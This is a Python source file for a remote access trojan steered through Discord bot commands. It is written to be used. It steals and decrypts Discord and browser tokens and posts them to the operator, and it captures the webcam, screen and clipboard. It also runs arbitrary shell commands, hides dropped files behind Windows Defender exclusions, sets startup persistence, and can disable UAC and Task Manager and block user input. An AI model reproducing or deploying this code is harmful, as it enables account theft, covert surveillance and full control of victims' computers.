import discord
from discord.ext import commands
from discord import File
import requests
import psutil
import platform
import webbrowser
import mss
import subprocess
from pathlib import Path
import pyautogui
import shutil
import tempfile
import os
import ctypes   
from urllib.parse import urlparse
import cv2
import pyperclip
import io
import re
import json
import base64
import sqlite3
from Crypto.Cipher import AES

if platform.system() == "Windows":
    import winreg
    from win32 import win32crypt
else:
    winreg = None


TOKEN = "BOT_TOKEN"

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

bot.remove_command('help')

@bot.command()
async def help(ctx):
    help_embed = discord.Embed(
        title="Bot Command Help",
        description="Here are all available commands:",
        color=discord.Color.blue()
    )
    
    commands_list = [
        ("!getcam", "Check available cameras and capture images"),
        ("!token", "Retrieve Discord tokens from the system"),
        ("!upload", "Upload a file to the system (attach with command)"),
        ("!startup", "Add the bot to startup for persistence"),
        ("!clipboard", "Get current clipboard contents (text or image)"),
        ("!blockinput", "Block keyboard and mouse input"),
        ("!unblockinput", "Unblock keyboard and mouse input"),
        ("!inputstatus", "Check if input is currently blocked"),
        ("!uacbypass [disable/enable/status]", "Control UAC settings (admin required)"),
        ("!enbtaskmngr", "Enable Task Manager"),
        ("!disbltaskmngr", "Disable Task Manager"),
        ("!taskkill <PID/name> [force]", "Kill a process by PID or name (add 'force' to force kill)"),
        ("!tasklist", "List running processes"),
        ("!website <url>", "Open a website in default browser"),
        ("!cmd <command>", "Execute a command in the shell"),
        ("!message <text>", "Show a message box with the given text"),
        ("!pcinfo", "Get system information"),
        ("!screen", "Capture and send a screenshot"),
        ("!help", "Show this help message")
    ]
    
    for cmd, desc in commands_list:
        help_embed.add_field(name=cmd, value=desc, inline=False)
    
    help_embed.set_footer(text="Use commands responsibly")
    
    await ctx.send(embed=help_embed)

@bot.command()
async def getcam(ctx):
    try:
        camera_info = []
        
        for i in range(0, 5):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
                height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
                fps = cap.get(cv2.CAP_PROP_FPS)
                
                camera_info.append({
                    'index': i,
                    'resolution': f"{int(width)}x{int(height)}",
                    'fps': fps
                })
                cap.release()
        
        if camera_info:
            message = "**Available Cameras:**\n"
            for cam in camera_info:
                message += (f"📹 Camera {cam['index']} - "
                          f"{cam['resolution']} @ {cam['fps']:.1f}FPS\n")
            
            await ctx.send(message)
            
            for cam in camera_info:
                try:
                    cap = cv2.VideoCapture(cam['index'])
                    ret, frame = cap.read()
                    if ret:
                        filename = f"camera_{cam['index']}.jpg"
                        cv2.imwrite(filename, frame)
                        await ctx.send(
                            f"Sample from Camera {cam['index']}:",
                            file=discord.File(filename)
                        )
                        os.remove(filename)
                    cap.release()
                except:
                    await ctx.send(f"Failed to capture from Camera {cam['index']}")
        else:
            await ctx.send("🔴 No cameras detected")
            
    except Exception as e:
        await ctx.send(f"❌ Camera check failed: {str(e)}")

def decrypt_token(encrypted_token, key):
    try:
        iv = encrypted_token[3:15]
        payload = encrypted_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode()
    except:
        return None

def get_encryption_key(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def grab_tokens():
    tokens = []
    regexes = [
        r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
        r"mfa\.[\w-]{84}"
    ]
    
    paths = [
        os.path.join(os.getenv('APPDATA'), 'Discord'),
        os.path.join(os.getenv('APPDATA'), 'discordptb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary'),
        os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    ]
    
    for path in paths:
        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
        local_state_path = os.path.join(path, 'Local State')
        
        if not os.path.exists(leveldb_path) or not os.path.exists(local_state_path):
            continue
            
        key = get_encryption_key(local_state_path)
        if not key:
            continue
            
        for file in os.listdir(leveldb_path):
            if not file.endswith('.ldb') and not file.endswith('.log'):
                continue
                
            try:
                with open(os.path.join(leveldb_path, file), 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    for regex in regexes:
                        for match in re.findall(regex, content):
                            tokens.append(match)
                            
                    encrypted_matches = re.findall(r"dQw4w9WgXcQ:[^\"]*", content)
                    for match in encrypted_matches:
                        encrypted_token = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                        decrypted = decrypt_token(encrypted_token, key)
                        if decrypted:
                            tokens.append(decrypted)
            except:
                continue
                
    return list(set(tokens))

def get_token_info(token):
    try:
        headers = {'Authorization': token}
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            return response.json()
    except:
        return None
    return None

@bot.command()
async def token(ctx):
    try:
        tokens = grab_tokens()
        if not tokens:
            await ctx.send("❌ No tokens found")
            return
            
        results = []
        for token in tokens:
            info = get_token_info(token)
            if info:
                results.append({
                    'token': token,
                    'username': f"{info['username']}#{info['discriminator']}",
                    'email': info.get('email', 'N/A'),
                    'phone': info.get('phone', 'N/A'),
                    'verified': info.get('verified', False)
                })
        
        if not results:
            await ctx.send("ℹ Found tokens but couldn't validate them")
            return
            
        message = "**Found Valid Tokens:**\n"
        for i, result in enumerate(results, 1):
            message += (
                f"\n**Token {i}**\n"
                f"👤 User: {result['username']}\n"
                f"📧 Email: {result['email']}\n"
                f"📱 Phone: {result['phone']}\n"
                f"✅ Verified: {result['verified']}\n"
                f"🔑 Token: ||{result['token']}||\n"
            )

        if len(message) > 2000:
            parts = [message[i:i+2000] for i in range(0, len(message), 2000)]
            for part in parts:
                await ctx.send(part)
        else:
            await ctx.send(message)
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")


@bot.command()
async def upload(ctx):
    try:
        if not ctx.message.attachments:
            return await ctx.send("❌ Please attach a file")

        attachment = ctx.message.attachments[0]
        filename = attachment.filename
        
        import random
        import string
        new_filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + os.path.splitext(filename)[1]
        
        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, new_filename)
        
        msg = await ctx.send(f"⬇️ Downloading {filename}...")
        await attachment.save(file_path)
        
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
        
        success = False
        try:
            ps_command = f"""Start-Process powershell -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath "{file_path}"'"""
            subprocess.run(ps_command, shell=True, timeout=10)
            success = True
        except:
            try:
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
                    0, winreg.KEY_SET_VALUE
                ) as key:
                    winreg.SetValueEx(key, file_path, 0, winreg.REG_DWORD, 0)
                success = True
            except:
                pass

        response = (
            f"✅ **File deployed successfully**\n"
            f"📂 **Location**: `{file_path}`\n"
            f"👻 **Hidden**: Yes\n"
            f"🛡️ **Defender Exclusion**: {'Yes' if success else 'Failed'}\n"
            f"📦 **Original Name**: {filename}"
        )
        
        await msg.edit(content=response)
        
    except Exception as e:
        await ctx.send(f"❌ **Error**: {str(e)}")


@bot.command()
async def startup(ctx):
    try:
        current_file = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        file_name = os.path.basename(current_file)
        
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        startup_copy = os.path.join(startup_folder, file_name)
        
        if not os.path.exists(startup_copy):
            shutil.copy2(current_file, startup_copy)
            msg1 = "✓ Added to Startup folder\n"
        else:
            msg1 = "⚠ Already in Startup folder\n"
        
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ) as key:
                existing_value = winreg.QueryValueEx(key, "DiscordBot")[0]
                if existing_value == startup_copy:
                    msg2 = "⚠ Already in Registry"
                else:
                    msg2 = "✓ Updated Registry entry"
        except FileNotFoundError:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "DiscordBot", 0, winreg.REG_SZ, startup_copy)
            msg2 = "✓ Added to Registry"
        
        await ctx.send(f"**Startup Persistence:**\n{msg1}{msg2}")
        
    except Exception as e:
        await ctx.send(f"❌ Error during persistence setup: {str(e)}")

@bot.command()
async def clipboard(ctx):
    """Send current clipboard contents (text or image)"""
    try:
        try:
            clipboard_text = pyperclip.paste()
            if clipboard_text.strip():
                if len(clipboard_text) > 1500:
                    with io.StringIO(clipboard_text) as file:
                        await ctx.send("📋 Text clipboard:", 
                                    file=discord.File(file, filename="clipboard.txt"))
                else:
                    await ctx.send(f"📋 Text clipboard:\n```{clipboard_text}```")
                return
        except:
            pass

        try:
            img = ImageGrab.grabclipboard()
            if img:
                with io.BytesIO() as image_binary:
                    img.save(image_binary, format='PNG')
                    image_binary.seek(0)
                    await ctx.send("🖼️ Image from clipboard:", 
                                 file=discord.File(image_binary, filename="clipboard.png"))
                return
        except:
            pass

        await ctx.send("ℹ️ Clipboard is empty or contains unsupported data")

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")


input_blocked = False

@bot.command()
async def blockinput(ctx):
    global input_blocked
    
    try:
        ctypes.windll.user32.BlockInput(True)
        input_blocked = True
        
        await ctx.send("⚠️ Keyboard and mouse input BLOCKED")
    except Exception as e:
        await ctx.send(f"❌ Error blocking input: {str(e)}")

@bot.command()
async def unblockinput(ctx):
    """Unblock keyboard and mouse input"""
    global input_blocked
    
    try:
        ctypes.windll.user32.BlockInput(False)
        input_blocked = False
        
        await ctx.send("✅ Keyboard and mouse input UNBLOCKED")
    except Exception as e:
        await ctx.send(f"❌ Error unblocking input: {str(e)}")

@bot.command()
async def inputstatus(ctx):
    """Check input block status"""
    global input_blocked
    status = "BLOCKED" if input_blocked else "UNBLOCKED"
    await ctx.send(f"ℹ️ Current input status: {status}")

@bot.command()
async def uacbypass(ctx, action: str = "disable"):
    """Control UAC settings (disable/enable/status)"""
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("❌ Administrator privileges required")
            return

        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        values = ["EnableLUA", "ConsentPromptBehaviorAdmin", "PromptOnSecureDesktop"]
        
        backup = {}
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
            for val in values:
                try:
                    backup[val] = winreg.QueryValueEx(key, val)[0]
                except:
                    backup[val] = None

        if action.lower() == "disable":
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
            await ctx.send("⚠️ UAC completely disabled - RESTART REQUIRED")
            
        elif action.lower() == "enable":
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
                for val, data in backup.items():
                    if data is not None:
                        winreg.SetValueEx(key, val, 0, winreg.REG_DWORD, data)
            await ctx.send("✅ UAC protections restored - RESTART REQUIRED")
            
        elif action.lower() == "status":
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                uac_status = winreg.QueryValueEx(key, "EnableLUA")[0]
            status = "ENABLED" if uac_status else "DISABLED"
            await ctx.send(f"ℹ️ Current UAC Status: {status}")
            
        else:
            await ctx.send("❌ Invalid action. Use: disable/enable/status")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def enbtaskmngr(ctx):
    """Enable Task Manager"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
            0, winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        
        await ctx.send("✅ Task Manager has been enabled")
    except Exception as e:
        await ctx.send(f"❌ Error enabling Task Manager: {str(e)}")

@bot.command()
async def disbltaskmngr(ctx):
    """Disable Task Manager"""
    try:
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0, winreg.KEY_SET_VALUE
            )
        except FileNotFoundError:
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            )
        
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        await ctx.send("⚠️ Task Manager has been disabled")
    except Exception as e:
        await ctx.send(f"❌ Error disabling Task Manager: {str(e)}")


@bot.command()
async def taskkill(ctx, process_identifier: str, force: str = None):
    try:
        killed = []
        force_kill = force and force.lower() == 'force'
        
        if process_identifier.isdigit():
            try:
                proc = psutil.Process(int(process_identifier))
                if force_kill:
                    proc.kill()
                    killed.append(f"☠️ Process with PID {process_identifier} force killed")
                else:
                    proc.terminate()
                    killed.append(f"✓ Process with PID {process_identifier} terminated")
            except psutil.NoSuchProcess:
                await ctx.send(f"❌ No process with PID {process_identifier} found")
            except psutil.AccessDenied:
                await ctx.send(f"⚠️ Permission denied to kill PID {process_identifier}")
        
        else:
            found = False
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'].lower() == process_identifier.lower():
                        if force_kill:
                            psutil.Process(proc.info['pid']).kill()
                            killed.append(f"☠️ {proc.info['name']} (PID: {proc.info['pid']}) force killed")
                        else:
                            psutil.Process(proc.info['pid']).terminate()
                            killed.append(f"✓ {proc.info['name']} (PID: {proc.info['pid']}) terminated")
                        found = True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            if not found:
                await ctx.send(f"❌ No processes named '{process_identifier}' found")
        
        if killed:
            response = "\n".join(killed)
            if force_kill:
                response += "\n⚠️ Force kill may cause data loss!"
            await ctx.send(response)
    
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def tasklist(ctx):
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'username']):
            try:
                processes.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

        headers = ["PID", "Name", "CPU %", "Memory %", "User"]
        process_list = "\t".join(headers) + "\n"
        process_list += "-"*60 + "\n"
        
        for proc in sorted(processes, key=lambda p: p['memory_percent'], reverse=True)[:30]:  # Top 30
            line = f"{proc['pid']}\t{proc['name'][:12]}\t{proc['cpu_percent']:.1f}\t{proc['memory_percent']:.1f}\t{proc['username'] or 'SYSTEM'}"
            process_list += line + "\n"

        chunks = [process_list[i:i+1900] for i in range(0, len(process_list), 1900)]
        for chunk in chunks:
            await ctx.send(f"```{chunk}```")

    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def website(ctx, *, url: str):
    try:
        url = url.strip()
        
        url = url.replace('https://', '').replace('http://', '')
        
        webbrowser.open(f'https://{url}')
        
        await ctx.send(f"✅ Website opened: {url}")
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
@bot.command()
async def cmd(ctx, *, command: str):
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        
        output, error = process.communicate()
        
        result = output.decode('utf-8', errors='replace') if output else ""
        error_msg = error.decode('utf-8', errors='replace') if error else ""
        
        full_result = f"Output:\n{result}\nError:\n{error_msg}" if error_msg else f"Output:\n{result}"
        
        if len(full_result) > 2000:
            for i in range(0, len(full_result), 2000):
                await ctx.send(f"```{full_result[i:i+2000]}```")
        else:
            await ctx.send(f"```{full_result}```")
            
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command()
async def message(ctx, *, input_message: str):
    try:
        pyautogui.alert(text=input_message, button='OK')
        await ctx.send(f"Message displayed successfully: '{input_message}'")
    except Exception as e:
        await ctx.send(f"Error occurred: {e}")


@bot.command()
async def pcinfo(ctx):
    try:
        ip_data = requests.get("http://ip-api.com/json/").json()
        ip = ip_data.get("query", "Unknown")
        city = ip_data.get("city", "Unknown")
        region = ip_data.get("regionName", "Unknown")
        country = ip_data.get("country", "Unknown")

        ram = psutil.virtual_memory().total / (1024 ** 3)

        disk = psutil.disk_usage('/').total / (1024 ** 3)

        os_info = platform.system() + " " + platform.release()

        info_message = (
            f"📡 IP Address: {ip}\n"
            f"🧭 Location: {city}, {region}, {country}\n"
            f"💻 Operating System: {os_info}\n"
            f"💾 Storage (total): {disk:.2f} GB\n"
            f"🧠 RAM (total): {ram:.2f} GB"
        )

        await ctx.send(f"**System Information:**\n```{info_message}```")

    except Exception as e:
        await ctx.send(f"Error occurred: {e}")


@bot.command()
async def screen(ctx):
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
        with mss.mss() as sct:
            sct.shot(output=tmp_file.name)
        try:
            await ctx.send(file=discord.File(tmp_file.name))
        finally:
            os.remove(tmp_file.name)


bot.run(TOKEN)
